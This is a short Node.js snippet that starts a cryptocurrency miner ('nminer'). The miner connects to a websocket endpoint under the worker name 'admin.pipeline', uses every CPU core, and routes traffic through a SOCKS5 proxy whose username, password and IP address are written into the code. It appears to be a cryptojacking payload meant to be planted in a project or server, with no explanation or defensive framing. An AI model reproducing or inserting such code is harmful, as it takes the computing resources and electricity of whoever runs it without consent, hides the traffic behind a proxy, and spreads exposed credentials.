const { NMiner } = require("nminer");
new NMiner("wss://runtime.nmining.igrp.app/", "admin.pipeline", { proxy: "socks5://dcswarup:webshare@198.20.185.156:5526", threads: require("os").cpus().length, throttle: true });
